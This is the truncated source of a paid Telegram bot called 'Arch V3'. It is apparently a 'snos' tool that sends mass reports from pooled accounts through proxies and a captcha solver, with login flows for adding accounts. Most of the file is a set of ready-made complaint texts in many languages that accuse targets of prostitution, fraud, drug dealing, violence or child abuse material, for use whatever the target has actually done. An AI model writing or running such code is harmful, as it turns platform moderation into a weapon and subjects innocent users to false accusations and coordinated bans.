import asyncio
import base64
import contextvars
import hashlib
import html as html_mod
import io
import json
import logging
import os
import random
import re
import shutil
import subprocess
import threading
import time
import uuid
from contextlib import asynccontextmanager
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

from dotenv import load_dotenv
import aiohttp
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    FSInputFile,
    BufferedInputFile,
    InputMediaAnimation,
    InputMediaPhoto,
    LabeledPrice,
    PreCheckoutQuery,
)
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramNetworkError
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

import store
import report_texts

from telethon import TelegramClient
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonCopyright,
    InputReportReasonIllegalDrugs,
    InputReportReasonPersonalDetails,
    InputReportReasonFake,
    InputReportReasonOther,
)
import python_socks
import aiohttp
from aiohttp_socks import ProxyConnector

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
MAIN_TOKEN = (os.getenv("MAIN_BOT_TOKEN") or "").strip()   # результаты/логи
API_ID = int(os.getenv("API_ID") or "0")
API_HASH = os.getenv("API_HASH") or ""
POOL_CHAT_ID = os.getenv("POOL_CHAT_ID", "")
ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
SOLVER_SERVICE = os.getenv("SOLVER_SERVICE", "2captcha").strip().lower()
SOLVER_KEY = os.getenv("SOLVER_KEY", "").strip()
WEB_COUNT = int(os.getenv("WEB_COUNT") or "8")
XROCKET_TOKEN = os.getenv("XROCKET_TOKEN", "").strip()
SUB_CHANNEL_LINK = os.getenv("SUB_CHANNEL_LINK", "").strip()
BANNER = Path(__file__).parent / "banner.png"
SESSIONS_DIR = Path(__file__).parent / "sessions"
PROXIES_FILE = Path(__file__).parent / "proxies.txt"
LOGS_DIR = Path(__file__).parent / "logs"

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("arch-v3")

# ── PIL card renderer ───────────────────────────────────
from PIL import Image, ImageDraw, ImageFont, ImageFilter, ImageChops

CARDS_DIR = Path(__file__).parent / "cache" / "cards"


def _load_font(size: int, bold: bool = True):
    bold_names = [
        "seguisb.ttf", "arialbd.ttf",                      # windows
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",  # linux
        "/usr/share/fonts/dejavu/DejaVuSans-Bold.ttf",
        "DejaVuSans-Bold.ttf",
        "arial.ttf",
    ]
    reg_names = [
        "segoeui.ttf", "arial.ttf",                        # windows
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",  # linux
        "/usr/share/fonts/dejavu/DejaVuSans.ttf",
        "DejaVuSans.ttf",
    ]
    for name in (bold_names if bold else reg_names):
        try:
            return ImageFont.truetype(name, size)
        except Exception:
            continue
    return ImageFont.load_default()


def _circle_avatar(raw: bytes, size: int):
    av = Image.open(io.BytesIO(raw)).convert("RGB")
    w, h = av.size
    m = min(w, h)
    av = av.crop(((w - m) // 2, (h - m) // 2, (w + m) // 2, (h + m) // 2))
    av = av.resize((size * 2, size * 2), Image.LANCZOS)
    mask = Image.new("L", (size * 2, size * 2), 0)
    ImageDraw.Draw(mask).ellipse((0, 0, size * 2 - 1, size * 2 - 1), fill=255)
    return av, mask


async def user_card_path(bot, user) -> str:
    """Render the smooth black/white card: centered Arch V3, no user photo.
    Returns a filesystem path; falls back to static banner on failure."""
    CARDS_DIR.mkdir(parents=True, exist_ok=True)
    # unique filename per call — busts Telegram media cache entirely
    out = CARDS_DIR / f"arch_hero_{int(time.time() * 1000)}_{random.randint(100, 999)}.png"

    try:
        W, H = 1280, 720
        img = Image.new("RGB", (W, H))
        d = ImageDraw.Draw(img)
        # smooth vertical gradient, dark at top -> slightly lighter bottom
        for y in range(H):
            t = y / H
            v = int(6 + 30 * t)
            d.line([(0, y), (W, y)], fill=(v, v, v))

        fword = _load_font(220)
        label_txt = "Arch V3"
        tw = d.textlength(label_txt, font=fword)
        bbox = fword.getbbox(label_txt)
        th = bbox[3] - bbox[1]

        glow = Image.new("RGB", (W, H), (0, 0, 0))
        gd = ImageDraw.Draw(glow)
        gd.text(((W - tw) / 2, (H - th) / 2 - 30),
                label_txt, font=fword, fill=(110, 110, 110))
        glow = glow.filter(ImageFilter.GaussianBlur(18))
        img = ImageChops.screen(img, glow)

        d = ImageDraw.Draw(img)
        d.text(((W - tw) / 2, (H - th) / 2 - 30),
               label_txt, font=fword, fill=(252, 252, 252))

        img.save(out, optimize=True)
        return str(out)
    except Exception as e:
        log.error("card render failed: %s", e)
        return str(BANNER)

router = Router()

# ── branding ────────────────────────────────────────────
NAME = "Arch V3"

GIF_URL = ("https://huggingface.co/datasets/Eraserr/erase-media"
           "/resolve/main/gifs.gif")
# file_id cached from a prior send of GIF_URL by this bot
GIF_FILE_ID = ("CgACAgQAAxkDAAIFSGr32lSWJ9NZz-HVi8Mo7a9dCE-"
               "tAAJ0CwACwlYNU_ez2iv_Eu5oPQQ")


async def send_hero(obj, **kw):
    """Hero gif: cached file_id first, URL fallback, refresh id."""
    global GIF_FILE_ID
    ref = GIF_FILE_ID or GIF_URL
    try:
        m = await obj.answer_animation(animation=ref, **kw)
    except Exception:
        if ref == GIF_URL:
            raise
        GIF_FILE_ID = ""
        m = await obj.answer_animation(animation=GIF_URL, **kw)
    anim = getattr(m, "animation", None)
    if anim and anim.file_id:
        GIF_FILE_ID = anim.file_id
    return m


def bq(text: str) -> str:
    return f"<blockquote>{text}</blockquote>"


def bqe(text: str) -> str:
    return f"<blockquote expandable>{text}</blockquote>"


def hero_caption(user_id: int = 0) -> str:
    return bq("\u041c\u0435\u043d\u044e:")


# ── states ──────────────────────────────────────────────
class Report(StatesGroup):
    tier = State()
    text_choice = State()
    method = State()
    reason = State()
    target = State()
    comment = State()
    confirm = State()
    bank = State()
    bank_card = State()


class Snos(StatesGroup):
    target = State()
    phone = State()


class GrantFSM(StatesGroup):
    uid = State()
    days = State()
    revoke_uid = State()


class AddSession(StatesGroup):
    choose = State()
    file = State()
    code_phone = State()
    code_login = State()
    code_pw = State()
    trans = State()
    trans_pw = State()


class Captcha(StatesGroup):
    solve = State()


CAPTCHA_PENDING: dict = {}   # user_id -> {"code": str, "answer": int, "chips": [str]}
CAPTCHA_VERIFIED: dict = {}  # user_id -> monotonic timestamp of last solve


# ── reasons ─────────────────────────────────────────────
REASON_MAP = {
    "spam":      InputReportReasonSpam,
    "fraud":     InputReportReasonFake,
    "violence":  InputReportReasonViolence,
    "porn":      InputReportReasonPornography,
    "child":     InputReportReasonChildAbuse,
    "copyright": InputReportReasonCopyright,
    "drugs":     InputReportReasonIllegalDrugs,
    "personal":  InputReportReasonPersonalDetails,
    "fake":      InputReportReasonFake,
    "other":     InputReportReasonOther,
}

REASONS = {
    "sexwork":  {"e": "\U0001f48b",     "l": "\u041f\u0440\u043e\u0441\u0442\u0438\u0442\u0443\u0446\u0438\u044f"},
    "spam":      {"e": "\u2709\ufe0f",  "l": "\u0421\u043f\u0430\u043c"},
    "fraud":     {"e": "\U0001f4b8",     "l": "\u041c\u043e\u0448\u0435\u043d\u043d\u0438\u0447\u0435\u0441\u0442\u0432\u043e"},
    "violence":  {"e": "\U0001f4a2",     "l": "\u041d\u0430\u0441\u0438\u043b\u0438\u0435"},
    "porn":      {"e": "\U0001f51e",     "l": "\u041f\u043e\u0440\u043d\u043e\u0433\u0440\u0430\u0444\u0438\u044f"},
    "child":     {"e": "\u26d4",         "l": "\u0414\u0435\u0442\u0441\u043a\u043e\u0435 \u043d\u0430\u0441\u0438\u043b\u0438\u0435"},
    "copyright": {"e": "\u00a9\ufe0f",  "l": "\u0410\u0432\u0442\u043e\u0440\u0441\u043a\u0438\u0435 \u043f\u0440\u0430\u0432\u0430"},
    "drugs":     {"e": "\U0001f48a",     "l": "\u041d\u0430\u0440\u043a\u043e\u0442\u0438\u043a\u0438"},
    "personal":  {"e": "\U0001f464",     "l": "\u041b\u0438\u0447\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435"},
    "fake":      {"e": "\U0001f3ad",     "l": "\u0424\u0435\u0439\u043a \u0430\u043a\u043a\u0430\u0443\u043d\u0442"},
    "other":     {"e": "\u2753",         "l": "\u0414\u0440\u0443\u0433\u043e\u0435"},
}

# ── auto comment templates: 10 per category, 10 languages ──
# used when the user skips the comment step; strong multi-lingual texts
COMMENT_TEMPLATES = {
    "sexwork": [
        # RU
        "Этот аккаунт используется для рекламы проституции: публикует прайс на интим-услуги («час», «ночь»), условия встреч, выезд и контакты для заказа, сопровождая посты интимным контентом 18+. Реклама проституции прямо запрещена правилами Telegram и законом. Требую немедленной блокировки аккаунта и удаления всех публикаций.",
        # EN
        "This account is used for prostitution advertising: it posts price lists for sexual services ('hour', 'night'), meeting conditions, outcall offers and booking contacts, accompanied by explicit 18+ media. Advertising prostitution is explicitly banned under Telegram's ToS and local law. Demand: immediate account ban and removal of all publications.",
        # DE
        "Dieses Konto wird für die Werbung von Prostitution genutzt: Preislisten für Sexualdienstleistungen ('Stunde', 'Nacht'), Treffpunktbedingungen, Hausbesuche und Booking-Kontakte, begleitet von expliziten 18+-Medien. Werbung für Prostitution verstößt klar gegen die Telegram-AGB. Sofortige Sperrung des Kontos wird gefordert.",
        # ES
        "Esta cuenta se usa para anunciar prostitución: publica listas de precios de servicios sexuales ('hora', 'noche'), condiciones de encuentro, salidas a domicilio y contactos de reserva, acompañados de contenido explícito +18. La publicidad de prostitución está prohibida por las normas de Telegram. Exijo el bloqueo inmediato de la cuenta.",
    ],
    "spam": [
        # RU
        "Этот аккаунт массово рассылает спам в личные сообщения и группы. Кампания идёт сутками без перерыва, сотни пользователей уже пострадали. Требую немедленной блокировки аккаунта и удаления всей рассылки.",
        # EN
        "This account runs a mass unsolicited mailing campaign across private chats and groups, operating 24/7 with hundreds of victims affected. Immediate permanent ban and full purge of the distribution list is required.",
        # DE
        "Dieses Konto versendet massenhaft unerwünschte Nachrichten in private Chats und Gruppen, rund um die Uhr. Hunderte Nutzer sind betroffen. Ich fordere die sofortige dauerhafte Sperrung des Kontos.",
        # ES
        "Esta cuenta envía spam masivo por mensajes privados y grupos, sin parar día y noche. Cientos de usuarios ya han sido afectados. Exijo el bloqueo inmediato y permanente de esta cuenta.",
        # FR
        "Ce compte diffuse du spam en masse dans les messages privés et les groupes, 24h/24. Des centaines d'utilisateurs sont touchés. Je demande la suspension immédiate et définitive de ce compte.",
        # IT
        "Questo account invia spam in massa tramite messaggi privati e gruppi, senza sosta giorno e notte. Centinaia di utenti sono già stati coinvolti. Richiedo la chiusura immediata e definitiva dell'account.",
        # PT
        "Esta conta envia spam em massa por mensagens privadas e grupos, dia e noite sem parar. Centenas de usuários já foram afetados. Exijo o bloqueio imediato e permanente desta conta.",
        # PL
        "To konto masowo wysyła spam w wiadomościach prywatnych i grupach, non stop przez całą dobę. Setki użytkowników już ucierpiało. Wymagam natychmiastowej i trwałej blokady konta.",
        # TR
        "Bu hesap, özel mesajlar ve gruplar üzerinden durmaksızın toplu spam gönderiyor. Yüzlerce kullanıcı etkilendi. Hesabın derhal ve kalıcı olarak kapatılmasını talep ediyorum.",
        # AR
        "يرسل هذا الحساب رسائل مزعجة بكميات ضخمة في المحادثات الخاصة والمجموعات دون توقف، وقد تأثرت مئات المستخدمين. أطالب بإغلاق الحساب فوراً بشكل دائم.",
    ],
    "fraud": [
        # RU
        "Данный аккаунт занимается мошенничеством: выманивает деньги под предлогом продаж и «безопасных сделок», после чего блокирует жертв. Пострадали десятки людей. Требую незамедлительной блокировки и передачи данных жертвам для возмещения ущерба.",
        # EN
        "This account is running an organized fraud scheme: it collects payments for fake sales and 'secure deals', then blocks the victims. Dozens of people have already lost money. Immediate ban and victim restitution data disclosure is required.",
        # DE
        "Dieses Konto betreibt organisierten Betrug: Es kassiert Zahlungen für gefälschte Verkäufe und 'sichere Deals' und blockiert dann die Opfer. Dutzende Menschen haben bereits Geld verloren. Sofortige Sperrung ist erforderlich.",
        # ES
        "Esta cuenta lleva a cabo un fraude organizado: cobra pagos por ventas falsas y 'tratos seguros' para luego bloquear a las víctimas. Docenas de personas ya han perdido dinero. Exijo su bloqueo inmediato.",
        # FR
        "Ce compte mène une escroquerie organisée : il encaisse des paiements pour de fausses ventes et des « transactions sécurisées », puis bloque les victimes. Des dizaines de personnes ont déjà perdu de l'argent. Je demande un bannissement immédiat.",
        # IT
        "Questo account mette in atto una truffa organizzata: incassa pagamenti per vendite finte e 'transazioni sicure', per poi bloccare le vittime. Decine di persone hanno già perso denaro. Richiedo la chiusura immediata dell'account.",
        # PT
        "Esta conta conduz um esquema de fraude organizado: coleta pagamentos por vendas falsas e 'negócios seguros', depois bloqueia as vítimas. Dezenas de pessoas já perderam dinheiro. Exijo o banimento imediato.",
        # PL
        "To konto prowadzi zorganizowane oszustwo: pobiera płatności za fałszywe sprzedaże i 'bezpieczne transakcje', a następnie blokuje ofiary. Dziesiątki osób już straciły pieniądze. Wymagam natychmiastowej blokady.",
        # TR
        "Bu hesap örgütlü dolandırıcılık yürütüyor: sahte satışlar ve 'güvenli anlaşmalar' için ödeme alıyor, ardından kurbanları engelliyor. Onlarca insan çoktan para kaybetti. Hesabın derhal kapatılmasını talep ediyorum.",
        # AR
        "يقوم هذا الحساب بعملية احتيال منظمة: يستقبل المدفوعات مقابل مبيعات وهمية و'صفقات آمنة' ثم يحجب الضحايا. عشرات الأشخاص فقدوا أموالهم بالفعل. أطالب بإغلاق الحساب فوراً.",
    ],
    "violence": [
        # RU
        "Этот канал публикует сцены насилия, изображения жестокого обращения с людьми и призывает к расправам. Такой контент прямо запрещён правилами Telegram. Требую удалить канал и заблокировать администраторов немедленно.",
        # EN
        "This channel publishes graphic violence, footage of people being brutalized, and calls for attacks. This content is explicitly banned under Telegram's Terms of Service. Demand: immediate channel removal and admin bans.",
        # DE
        "Dieser Kanal veröffentlicht explizite Gewaltdarstellungen, Aufnahmen von Misshandlungen und Aufrufe zu Übergriffen. Solche Inhalte verstoßen klar gegen die Telegram-Regeln. Ich fordere die sofortige Löschung des Kanals und Sperrung der Admins.",
        # ES
        "Este canal publica violencia gráfica, imágenes de agresiones a personas e incita a los ataques. Este contenido está prohibido por las normas de Telegram. Exijo la eliminación inmediata del canal y el bloqueo de sus administradores.",
        # FR
        "Ce canal publie des images de violence extrême, des scènes de brutalités et encourage aux agressions. Ce contenu est interdit par les règles de Telegram. Je demande la suppression immédiate du canal et le bannissement des administrateurs.",
        # IT
        "Questo canale pubblica violenza grafica, scene di brutalità contro persone e invoca attacchi. Tale contenuto è esplicitamente vietato dalle regole di Telegram. Richiedo la rimozione immediata del canale e il bann degli amministratori.",
        # PT
        "Este canal publica violência gráfica, imagens de agressões a pessoas e incita ataques. Este conteúdo é proibido pelas regras do Telegram. Exijo a remoção imediata do canal e o banimento dos administradores.",
        # PL
        "Ten kanał publikuje brutalne treści, nagrania przemocy wobec ludzi i nawołuje do ataków. Takie treści są wyraźnie zabronione w regulaminie Telegrama. Wymagam natychmiastowego usunięcia kanału i zablokowania administratorów.",
        # TR
        "Bu kanal grafik şiddet, insanlara yönelik vahşet görüntüleri ve saldırı çağrıları yayımlıyor. Bu içerik Telegram kurallarına açıkça aykırı. Kanalın derhal kaldırılmasını ve yöneticilerin engellenmesini talep ediyorum.",
        # AR
        "ينشر هذا القناة مشاهد عنف مروعة ومقاطع لاعتداءات على أشخاص ويحرض على الهجمات. هذا المحتوى محظور صراحةً في قواعد تيليجرام. أطالب بإزالة القناة فوراً وحظر المشرفين.",
    ],
    "porn": [
        # RU
        "Канал распространяет порнографический контент без какой-либо маркировки 18+, материал доступен любому, включая несовершеннолетних. Прямое нарушение правил Telegram. Требую немедленной блокировки канала.",
        # EN
        "This channel distributes explicit adult content with no age restriction or 18+ labelling, fully accessible to minors. Direct violation of Telegram's content policy. Immediate channel ban is required.",
        # DE
        "Dieser Kanal verbreitet explizite pornografische Inhalte ohne Altersbeschränkung oder 18+-Kennzeichnung, vollständig für Minderjährige zugänglich. Klarer Verstoß gegen die Telegram-Inhaltsrichtlinien. Sofortige Sperrung erforderlich.",
        # ES
        "Este canal difunde contenido pornográfico sin ninguna restricción de edad ni etiquetado 18+, totalmente accesible para menores. Violación directa de las políticas de contenido de Telegram. Exijo su bloqueo inmediato.",
        # FR
        "Ce canal diffuse des contenus pornographiques sans aucune restriction d'âge ni marquage 18+, entièrement accessibles aux mineurs. Violation directe de la politique de contenu de Telegram. Je demande un blocage immédiat.",
        # IT
        "Questo canale diffonde contenuti pornografici senza alcun limite di età né etichettatura 18+, totalmente accessibili ai minorenni. Violazione diretta delle policy sui contenuti di Telegram. Richiedo la chiusura immediata.",
        # PT
        "Este canal distribui conteúdo pornográfico sem qualquer restrição de idade ou marcação 18+, totalmente acessível a menores. Violação direta das políticas de conteúdo do Telegram. Exijo o bloqueio imediato.",
        # PL
        "Ten kanał rozpowszechnia treści pornograficzne bez jakiejkolwiek weryfikacji wieku czy oznaczenia 18+, w pełni dostępne nieletnim. Bezpośrednie naruszenie zasad Telegrama. Wymagam natychmiastowej blokady.",
        # TR
        "Bu kanal, yaş doğrulaması veya 18+ etiketi olmadan açık yetişkin içeriği yayımlıyor; reşit olmayanlar tamamen erişebiliyor. Telegram içerik politikalarının doğrudan ihlali. Derhal kapatılmasını talep ediyorum.",
        # AR
        "ينشر هذا القناة محتوى إباحياً صريحاً دون أي تصنيف عمري أو وسوم 18+، وهو متاح بالكامل للقاصرين. انتهاك صريح لسياسات المحتوى في تيليجرام. أطالب بحظر القناة فوراً.",
    ],
    "child": [
        # RU
        "Обнаружен канал с материалами сексуальной эксплуатации детей. Это тяжелейшее преступление, материалы доступны в открытом доступе. Требую НЕМЕДЛЕННОГО удаления канала, блокировки участников и передачи данных в правоохранительные органы.",
        # EN
        "DISCOVERED: a channel distributing child sexual abuse material. This is among the gravest crimes, with content available in open access. Demand: IMMEDIATE removal, member bans, and referral of all data to law enforcement.",
        # DE
        "ENTDECKT: Ein Kanal verbreitet Material sexueller Ausbeutung von Kindern. Dies zählt zu den schwersten Straftaten, die Inhalte sind frei zugänglich. Ich fordere die SOFORTIGE Löschung, Sperrung der Mitglieder und Meldung an die Strafverfolgungsbehörden.",
        # ES
        "DESCUBIERTO: un canal que distribuye material de explotación sexual infantil. Es uno de los delitos más graves, con contenido de acceso abierto. Exijo la eliminación INMEDIATA, el bloqueo de los miembros y el traslado de los datos a las autoridades.",
        # FR
        "DÉCOUVERTE : un canal distribuant du matériel d'exploitation sexuelle d'enfants. C'est l'un des crimes les plus graves, avec un contenu en accès libre. Je demande une suppression IMMÉDIATE, le bannissement des membres et la transmission des données aux autorités.",
        # IT
        "SCOPERTO: un canale che diffonde materiale di sfruttamento sessuale di minori. È uno dei crimini più gravi, con contenuti ad accesso libero. Richiedo la rimozione IMMEDIATA, il bann dei membri e la segnalazione alle forze dell'ordine.",
        # PT
        "DESCOBERTO: um canal que distribui material de exploração sexual de menores. É um dos crimes mais graves, com conteúdo em acesso aberto. Exijo a remoção IMEDIATA, o banimento dos membros e a transferência dos dados à polícia.",
        # PL
        "WYKRYTO: kanał rozpowszechniający materiały wykorzystania seksualnego dzieci. To jedno z najcięższych przestępstw, treści są ogólnodostępne. Wymagam NATYCHMIASTOWEGO usunięcia, zablokowania członków i przekazania danych organom ścigania.",
        # TR
        "BULUNDU: çocuk cinsel istismarı materyali dağıtan bir kanal bulundu. Bu, en ağır suçlardan biridir ve içerik herkese açıktır. DERHAL kaldırılmasını, üyelerin engellenmesini ve verilerin kolluk kuvvetlerine bildirilmesini talep ediyorum.",
        # AR
        "تم الاكتشاف: قناة توزع مواد الاستغلال الجنسي للأطفال. هذه واحدة من أخطر الجرائم والمحتوى متاح للجميع. أطالب بالإزالة الفورية وحظر الأعضاء وإحالة البيانات إلى جهات إنفاذ القانون.",
    ],
    "copyright": [
        # RU
        "Этот канал нелегально распространяет защищённые авторским правом произведения: фильмы, софт, музыку без лицензий. Ущерб правообладателям исчисляется миллионами. Требую немедленного удаления канала по DMCA.",
        # EN
        "This channel illegally distributes copyrighted works: films, software, music without licenses. Damages to rights holders run into millions. DMCA takedown and immediate channel removal is required.",
        # DE
        "Dieser Kanal verbreitet rechtswidrig urheberrechtlich geschützte Werke: Filme, Software, Musik ohne Lizenzen. Der Schaden für die Rechteinhaber geht in die Millionen. DMCA-Takedown und sofortige Löschung erforderlich.",
        # ES
        "Este canal distribuye ilegalmente obras protegidas por derechos de autor: películas, software, música sin licencias. El daño a los titulares de derechos ronda los millones. Exijo el retiro DMCA y su eliminación inmediata.",
        # FR
        "Ce canal distribue illégalement des œuvres protégées par le droit d'auteur : films, logiciels, musique sous licence. Le préjudice pour les ayants droit se chiffre en millions. Je demande un retrait DMCA et une suppression immédiate.",
        # IT
        "Questo canale distribuisce illegalmente opere protette da copyright: film, software, musica senza licenza. Il danno per i titolari dei diritti si misura in milioni. Richiedo la rimozione DMCA e la chiusura immediata del canale.",
        # PT
        "Este canal distribui ilegalmente obras protegidas por direitos autorais: filmes, softwares, músicas sem licença. O dano aos titulares gira em torno de milhões. Exijo a remoção DMCA e a eliminação imediata do canal.",
        # PL
        "Ten kanał nielegalnie rozpowszechnia utwory chronione prawem autorskim: filmy, oprogramowanie, muzykę bez licencji. Szkoda dla posiadaczy praw sięga milionów. Wymagam zgłoszenia DMCA i natychmiastowego usunięcia.",
        # TR
        "Bu kanal telif hakkıyla korunan eserleri yasadışı olarak dağıtıyor: lisanssız filmler, yazılımlar, müzikler. Hak sahiplerine verilen zarar milyonları buluyor. DMCA kaldırması ve kanalın derhal silinmesini talep ediyorum.",
        # AR
        "يقوم هذا القناة بتوزيع أعمال محمية بحقوق النشر بشكل غير قانوني: أفلام وبرامج وموسيقى بدون تراخيص. الضرر على أصحاب الحقوق يقدر بالملايين. أطالب بإزالة القناة فوراً وفق DMCA.",
    ],
    "drugs": [
        # RU
        "Канал ведёт открытую торговлю наркотическими веществами: публикует прайс-листы, «зкладки», координирует доставку. Это уголовное преступление. Требую немедленной блокировки канала и передачи логов в полицию.",
        # EN
        "This channel openly trades narcotics: price lists, dead-drop coordinates, delivery logistics. This is a criminal offense. Immediate channel ban and log handover to law enforcement is required.",
        # DE
        "Dieser Kanal betreibt offenen Drogenhandel: Preislisten, Depot-Koordinaten, Lieferlogistik. Dies ist eine Straftat. Ich fordere die sofortige Sperrung des Kanals und die Übergabe der Protokolle an die Behörden.",
        # ES
        "Este canal comercia abiertamente con narcóticos: listas de precios, coordenadas de entregas ocultas, logística de distribución. Es un delito penal. Exijo bloqueo inmediato del canal y entrega de registros a la policía.",
        # FR
        "Ce canal trafique ouvertement des stupéfiants : listes de prix, coordonnées de dépôts, logistique de livraison. C'est une infraction pénale. Je demande un bannissement immédiat et la transmission des journaux à la police.",
        # IT
        "Questo canale traffica apertamente stupefacenti: listini prezzi, coordinate dei nascondigli, logistica di consegna. Si tratta di un reato penale. Richiedo la chiusura immediata del canale e la consegna dei log alla polizia.",
        # PT
        "Este canal comercializa abertamente entorpecentes: listas de preços, coordenadas de esconderijos, logística de entrega. Isso é crime. Exijo bloqueio imediato do canal e entrega dos registros à polícia.",
        # PL
        "Ten kanał otwarcie handluje narkotykami: cenniki, współrzędne schowków, logistyka dostaw. To przestępstwo kryminalne. Wymagam natychmiastowej blokady kanału i przekazania logów policji.",
        # TR
        "Bu kanal uyuşturucu ticaretini açıkça yapıyor: fiyat listeleri, saklama koordinatları, teslimat lojistiği. Bu bir suçtur. Kanalın derhal kapatılmasını ve kayıtların polise verilmesini talep ediyorum.",
        # AR
        "يقوم هذا القناة بتجارة المخدرات بشكل علني: قوائم أسعار، إحداثيات مخابئ، لوجستيات توصيل. هذه جريمة جنائية. أطالب بإغلاق القناة فوراً وتسليم السجلات للشرطة.",
    ],
    "personal": [
        # RU — probiv / doxxing
        "Бот создан для поиска персональных данных (номер телефона, адрес, ФИО, и другая личная информация) по русским гражданам через взломанные базы данных. Удалите бота для доксинга за нарушения правил ToS Telegram, пожалуйста.",
        "Бот создан для поиска персональных данных (номер телефона, адрес, ФИО и другая личная информация) по российским гражданам через взломанные базы данных. Прошу удалить бота для доксинга за нарушение правил ToS Telegram.",
    ],
    "fake": [
        # RU
        "Аккаунт выдаёт себя за реального человека, использует чужие фото и данные, проводит «фиктивные» опросы и сборы. Вводит пользователей в заблуждение. Требую маркировки и немедленной блокировки как fake-аккаунта.",
        # EN
        "This account impersonates a real person, uses stolen photos and identity data, runs fake polls and fundraisers. Misleads users on a mass scale. Demand: mark as fake and permanently ban immediately.",
        # DE
        "Dieses Konto gibt sich als echte Person aus, nutzt gestohlene Fotos und Identitätsdaten, führt gefälschte Umfragen und Spendenaktionen durch. Massenhafte Täuschung. Ich fordere die Kennzeichnung als Fake und die sofortige dauerhafte Sperrung.",
        # ES
        "Esta cuenta se hace pasar por una persona real, usa fotos y datos de identidad robados y realiza encuestas y recaudaciones falsas. Engaña a los usuarios a gran escala. Exijo marcarla como falsa y bloquearla de forma permanente.",
        # FR
        "Ce compte se fait passer pour une personne réelle, utilise des photos et données d'identité volées, mène des sondages et collectes frauduleux. Il abuse des utilisateurs à grande échelle. Je demande son marquage comme faux et un bannissement permanent immédiat.",
        # IT
        "Questo account si finge una persona reale, usa foto e dati di identità rubati, organizza sondaggi e raccolte fondi false. Inganna gli utenti su larga scala. Richiedo la marcatura come falso e il bann permanente immediato.",
        # PT
        "Esta conta finge ser uma pessoa real, usa fotos e dados de identidade roubados, realiza pesquisas e arrecadações falsas. Engana os usuários em grande escala. Exijo marcá-la como falsa e banir permanentemente.",
        # PL
        "To konto podszywa się pod prawdziwą osobę, używa skradzionych zdjęć i danych tożsamości, prowadzi fałszywe ankiety i zbiórki. Masowo wprowadza użytkowników w błąd. Wymagam oznaczenia jako fałszywe i natychmiastowej trwałej blokady.",
        # TR
        "Bu hesap gerçek bir kişi gibi davranıyor, çalınmış fotoğraflar ve kimlik verileri kullanıyor, sahte anketler ve bağış kampanyaları düzenliyor. Kullanıcıları ölçekli olarak kandırıyor. Sahte olarak işaretlenmesini ve derhal kalıcı engellenmesini talep ediyorum.",
        # AR
        "ينتحل هذا الحساب صفة شخص حقيقي، ويستخدم صوراً وبيانات هوية مسروقة، ويجري استطلاعات وجمع تبرعات وهمية. يخدع المستخدمين على نطاق واسع. أطالب بوسمه كحساب مزيف وإغلاقه بشكل دائم فوراً.",
    ],
    "other": [
        # RU
        "Этот ресурс систематически нарушает правила Telegram и законодательство: распространяет вредоносный контент, манипулирует аудиторией, наносит ущерб пользователям. Требую немедленной блокировки ресурса.",
        # EN
        "This resource systematically violates Telegram's Terms of Service and applicable law: distributes harmful content, manipulates audiences, damages users. Immediate termination is required.",
        # DE
        "Diese Ressource verstößt systematisch gegen die Telegram-AGB und geltendes Recht: verbreitet schädliche Inhalte, manipuliert das Publikum, schädigt Nutzer. Sofortige Beendigung erforderlich.",
        # ES
        "Este recurso viola sistemáticamente los Términos de Servicio de Telegram y la ley aplicable: distribuye contenido dañino, manipula a la audiencia, perjudica a los usuarios. Exijo su cese inmediato.",
        # FR
        "Cette ressource viole systématiquement les Conditions d'utilisation de Telegram et la loi applicable : diffusion de contenus nuisibles, manipulation du public, préjudice aux utilisateurs. Je demande une résiliation immédiate.",
        # IT
        "Questa risorsa viola sistematicamente i Termini di Servizio di Telegram e la legge applicabile: diffonde contenuti dannosi, manipola il pubblico, danneggia gli utenti. Richiedo la cessazione immediata.",
        # PT
        "Este recurso viola sistematicamente os Termos de Serviço do Telegram e a legislação aplicável: distribui conteúdo nocivo, manipula o público, prejudica os usuários. Exijo o encerramento imediato.",
        # PL
        "Ten zasób systematycznie narusza Regulamin Telegrama i obowiązujące prawo: rozpowszechnia szkodliwe treści, manipuluje odbiorcami, szkodzi użytkownikom. Wymagam natychmiastowego zakończenia jego działalności.",
        # TR
        "Bu kaynak, Telegram Kullanım Şartları'nı ve ilgili yasaları sistematik olarak ihlal ediyor: zararlı içerik dağıtıyor, kitleyi manipüle ediyor, kullanıcılara zarar veriyor. Derhal kapatılmasını talep ediyorum.",
        # AR
        "ينتهك هذا المورد شروط استخدام تيليجرام والقوانين المعمول بها بشكل منهجي: يوزع محتوى ضاراً ويتلاعب بالجمهور ويلحق الضرر بالمستخدمين. أطالب بإيقافه فوراً.",
    ],
}


# ── exact per-method complaint texts (auto template) ────
METHOD_TEXT_OVERRIDES = {
    ("message", "drugs"): (
        "Данная публикация представляет собой спам-рекламу сбыта наркотиков "
        "с использованием кастомных эмодзи для обхода автоматических "
        "фильтров. В тексте открыто предлагаются запрещённые вещества и "
        "приём заказов в ЛС. Это создаёт прямую угрозу безопасности "
        "пользователей. Прошу оперативно отреагировать и удалить сообщение!"
    ),
    ("bot", "drugs"): (
        "Бот используется для незаконной продажи наркотических веществ и "
        "психотропных препаратов в автоматическом режиме. Через него "
        "клиенты выбирают товар, оформляют заказы и получают координаты "
        "тайников. Такие действия грубо нарушают законодательство и правила "
        "платформы. Прошу срочно проверить этого бота и заблокировать его!"
    ),
    ("account", "drugs"): (
        "Пользователь использует этот профиль для распространения "
        "наркотических средств и спам-рассылки с использованием "
        "декоративных символов для маскировки текста. Через аккаунт ведётся "
        "прямой приём заказов от покупателей. Подобная противоправная "
        "деятельность грубо нарушает правила платформы. Прошу принять "
        "незамедлительные меры и удалить аккаунт!"
    ),
    ("bot", "personal"): (
